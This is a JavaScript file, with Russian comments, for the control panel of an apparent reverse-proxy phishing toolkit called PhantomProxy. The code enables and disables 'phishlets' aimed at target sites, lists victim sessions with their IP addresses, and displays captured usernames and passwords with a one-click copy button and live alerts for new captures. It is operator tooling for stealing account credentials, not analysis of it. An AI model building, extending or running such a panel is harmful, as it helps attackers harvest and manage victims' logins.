// PhantomProxy Control Panel - Main JavaScript

const API_BASE = '/api/v1';
let API_KEY = localStorage.getItem('apiKey') || 'change-me-to-secure-random-string';
let logsPaused = false;
let activityChart = null;
let eventSource = null;

// Инициализация
document.addEventListener('DOMContentLoaded', function() {
    initDashboard();
    loadPhishlets();
    loadSessions();
    loadCredentials();
    connectSSE();
    initChart();
});

// Переключение секций
function showSection(sectionId) {
    document.querySelectorAll('.section').forEach(el => el.classList.add('d-none'));
    document.getElementById(sectionId).classList.remove('d-none');
    
    document.querySelectorAll('.nav-link').forEach(el => el.classList.remove('active'));
    event.target.closest('.nav-link').classList.add('active');
    
    // Обновляем данные при переключении
    if (sectionId === 'phishlets') loadPhishlets();
    if (sectionId === 'sessions') loadSessions();
    if (sectionId === 'credentials') loadCredentials();
}

// Инициализация dashboard
async function initDashboard() {
    try {
        const stats = await apiRequest('/stats');
        updateDashboard(stats);
    } catch (error) {
        addLog('Failed to load stats: ' + error.message, 'error');
    }
    
    // Автообновление каждые 5 секунд
    setInterval(() => {
        if (!logsPaused) {
            initDashboard();
        }
    }, 5000);
}

// Обновление dashboard
function updateDashboard(stats) {
    document.getElementById('activePhishlets').textContent = stats.phishlets?.active || 0;
    document.getElementById('activeSessions').textContent = stats.sessions?.active || 0;
    document.getElementById('capturedCredentials').textContent = stats.credentials?.total || 0;
    document.getElementById('requestsToday').textContent = stats.requests?.today || 0;
    
    // Обновление графика
    if (activityChart) {
        updateChart(stats);
    }
}

// Загрузка phishlets
async function loadPhishlets() {
    try {
        const phishlets = await apiRequest('/phishlets');
        renderPhishlets(phishlets);
    } catch (error) {
        addLog('Failed to load phishlets: ' + error.message, 'error');
    }
}

// Рендер phishlets
function renderPhishlets(phishlets) {
    const container = document.getElementById('phishletsList');
    container.innerHTML = '';
    
    phishlets.forEach(phishlet => {
        const col = document.createElement('div');
        col.className = 'col-md-6 col-lg-4';
        col.innerHTML = `
            <div class="phishlet-item ${phishlet.enabled ? 'active' : ''}">
                <div class="d-flex justify-content-between align-items-start">
                    <div>
                        <h5 class="mb-1">${phishlet.name}</h5>
                        <small class="text-muted">${phishlet.id}</small>
                        <div class="mt-2">
                            <span class="badge ${phishlet.enabled ? 'badge-success' : 'badge-secondary'}">
                                ${phishlet.enabled ? 'Active' : 'Inactive'}
                            </span>
                        </div>
                    </div>
                    <div class="btn-group">
                        ${phishlet.enabled 
                            ? `<button class="btn btn-sm btn-danger" onclick="togglePhishlet('${phishlet.id}', false)">
                                 <i class="bi bi-power"></i>
                               </button>`
                            : `<button class="btn btn-sm btn-success" onclick="togglePhishlet('${phishlet.id}', true)">
                                 <i class="bi bi-power"></i>
                               </button>`
                        }
                        <button class="btn btn-sm btn-primary" onclick="viewPhishlet('${phishlet.id}')">
                            <i class="bi bi-eye"></i>
                        </button>
                    </div>
                </div>
                <div class="mt-3">
                    <small class="text-muted">Target: ${phishlet.target?.primary || 'N/A'}</small>
                </div>
            </div>
        `;
        container.appendChild(col);
    });
}

// Переключение phishlet
async function togglePhishlet(id, enable) {
    try {
        const endpoint = enable ? `/phishlets/${id}/enable` : `/phishlets/${id}/disable`;
        await apiRequest(endpoint, 'POST');
        addLog(`Phishlet ${id} ${enable ? 'enabled' : 'disabled'}`, 'success');
        loadPhishlets();
    } catch (error) {
        addLog('Failed to toggle phishlet: ' + error.message, 'error');
    }
}

// Загрузка сессий
async function loadSessions() {
    try {
        const sessions = await apiRequest('/sessions');
        renderSessions(sessions);
    } catch (error) {
        addLog('Failed to load sessions: ' + error.message, 'error');
    }
}

// Рендер сессий
function renderSessions(sessions) {
    const container = document.getElementById('sessionsList');
    
    if (!sessions || sessions.length === 0) {
        container.innerHTML = '<div class="text-center text-muted py-5">Нет активных сессий</div>';
        return;
    }
    
    container.innerHTML = sessions.map(session => `
        <div class="session-item">
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <strong>${session.id}</strong>
                    <div class="text-muted small">
                        <i class="bi bi-pc-display"></i> ${session.victim_ip || 'Unknown'} | 
                        <i class="bi bi-globe"></i> ${session.target_host || 'Unknown'}
                    </div>
                </div>
                <div>
                    <span class="badge badge-success">Active</span>
                    <button class="btn btn-sm btn-danger ms-2" onclick="deleteSession('${session.id}')">
                        <i class="bi bi-trash"></i>
                    </button>
                </div>
            </div>
            <div class="mt-2 small text-muted">
                <i class="bi bi-clock"></i> ${new Date(session.created_at).toLocaleString()}
            </div>
        </div>
    `).join('');
}

// Удаление сессии
async function deleteSession(id) {
    if (!confirm('Удалить сессию?')) return;
    
    try {
        await apiRequest(`/sessions/${id}`, 'DELETE');
        addLog(`Session ${id} deleted`, 'success');
        loadSessions();
    } catch (error) {
        addLog('Failed to delete session: ' + error.message, 'error');
    }
}

// Загрузка credentials
async function loadCredentials() {
    try {
        const credentials = await apiRequest('/credentials');
        renderCredentials(credentials);
    } catch (error) {
        addLog('Failed to load credentials: ' + error.message, 'error');
    }
}

// Рендер credentials
function renderCredentials(credentials) {
    const container = document.getElementById('credentialsList');
    
    if (!credentials || credentials.length === 0) {
        container.innerHTML = '<div class="text-center text-muted py-5">Нет перехваченных credentials</div>';
        return;
    }
    
    container.innerHTML = credentials.map(cred => `
        <div class="credential-item">
            <div class="d-flex justify-content-between align-items-start">
                <div>
                    <div class="mb-1">
                        <i class="bi bi-person"></i> <strong>${cred.username || 'N/A'}</strong>
                    </div>
                    <div class="mb-1">
                        <i class="bi bi-key"></i> <code>${cred.password || 'N/A'}</code>
                    </div>
                    <div class="small text-muted">
                        <i class="bi bi-link"></i> ${cred.target || 'N/A'} | 
                        <i class="bi bi-clock"></i> ${new Date(cred.captured_at).toLocaleString()}
                    </div>
                </div>
                <button class="btn btn-sm btn-outline-primary" onclick="copyCredential('${cred.username}', '${cred.password}')">
                    <i class="bi bi-clipboard"></i> Копировать
                </button>
            </div>
        </div>
    `).join('');
}

// Копирование credentials
function copyCredential(username, password) {
    navigator.clipboard.writeText(`${username}:${password}`);
    addLog('Credentials copied to clipboard', 'success');
}

// Экспорт credentials
function exportCredentials() {
    addLog('Exporting credentials...', 'info');
    // TODO: Реализовать экспорт
}

// Подключение к SSE
function connectSSE() {
    eventSource = new EventSource(`${API_BASE}/events`);
    
    eventSource.onmessage = function(event) {
        const data = JSON.parse(event.data);
        handleEvent(data);
    };
    
    eventSource.onerror = function() {
        addLog('SSE connection lost, reconnecting...', 'warning');
        setTimeout(connectSSE, 5000);
    };
}

// Обработка событий
function handleEvent(data) {
    switch(data.type) {
        case 'credential.captured':
            addLog(`New credentials captured: ${data.username}`, 'success');
            loadCredentials();
            updateDashboard({ credentials: { total: parseInt(document.getElementById('capturedCredentials').textContent) + 1 } });
            break;
        case 'session.created':
            addLog(`New session created: ${data.session_id}`, 'info');
            loadSessions();
            break;
        case 'proxy.request':
            addLog(`Request: ${data.method} ${data.path} from ${data.ip}`, 'info');
            break;
    }
}

// Добавление лога
function addLog(message, type = 'info') {
    const terminal = document.getElementById('logTerminal');
    const timestamp = new Date().toLocaleTimeString();
    const logClass = `log-${type}`;
    
    const entry = document.createElement('div');
    entry.className = `log-entry ${logClass}`;
    entry.textContent = `[${timestamp}] ${message}`;
    
    terminal.appendChild(entry);
    terminal.scrollTop = terminal.scrollHeight;
    
    // Ограничиваем количество логов
    while (terminal.children.length > 100) {
        terminal.removeChild(terminal.firstChild);
    }
}

// Очистка логов
function clearLogs() {
    document.getElementById('logTerminal').innerHTML = '';
    addLog('Logs cleared', 'info');
}

// Toggle паузы логов
document.getElementById('toggleLogs')?.addEventListener('click', function() {
    logsPaused = !logsPaused;
    this.innerHTML = logsPaused 
        ? '<i class="bi bi-play"></i> Продолжить' 
        : '<i class="bi bi-pause"></i> Пауза';
});

// API запрос
async function apiRequest(endpoint, method = 'GET', data = null) {
    const options = {
        method,
        headers: {
            'X-API-Key': API_KEY,
            'Content-Type': 'application/json'
        }
    };
    
    if (data) {
        options.body = JSON.stringify(data);
    }
    
    const response = await fetch(`${API_BASE}${endpoint}`, options);
    
    if (!response.ok) {
        throw new Error(`API Error: ${response.status}`);
    }
    
    return await response.json();
}

// Инициализация графика
function initChart() {
    const ctx = document.getElementById('activityChart').getContext('2d');
    activityChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: [],
            datasets: [{
                label: 'Requests',
                data: [],
                borderColor: '#6366f1',
                backgroundColor: 'rgba(99, 102, 241, 0.1)',
                tension: 0.4,
                fill: true
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: {
                    display: false
                }
            },
            scales: {
                x: {
                    display: false
                },
                y: {
                    beginAtZero: true,
                    grid: {
                        color: 'rgba(255, 255, 255, 0.1)'
                    }
                }
            }
        }
    });
}

// Обновление графика
function updateChart(stats) {
    const now = new Date().toLocaleTimeString();
    
    if (activityChart.data.labels.length > 20) {
        activityChart.data.labels.shift();
        activityChart.data.datasets[0].data.shift();
    }
    
    activityChart.data.labels.push(now);
    activityChart.data.datasets[0].data.push(stats.requests?.per_minute || 0);
    activityChart.update();
}

// Обновление всех данных
function refreshAll() {
    addLog('Refreshing all data...', 'info');
    loadPhishlets();
    loadSessions();
    loadCredentials();
    initDashboard();
}

// Сохранение настроек
document.getElementById('settingsForm')?.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const settings = {
        apiKey: document.getElementById('apiKey').value,
        httpsPort: document.getElementById('httpsPort').value,
        apiPort: document.getElementById('apiPort').value,
        domain: document.getElementById('domain').value,
        debug: document.getElementById('debugMode').checked
    };
    
    localStorage.setItem('apiKey', settings.apiKey);
    API_KEY = settings.apiKey;
    
    addLog('Settings saved', 'success');
});
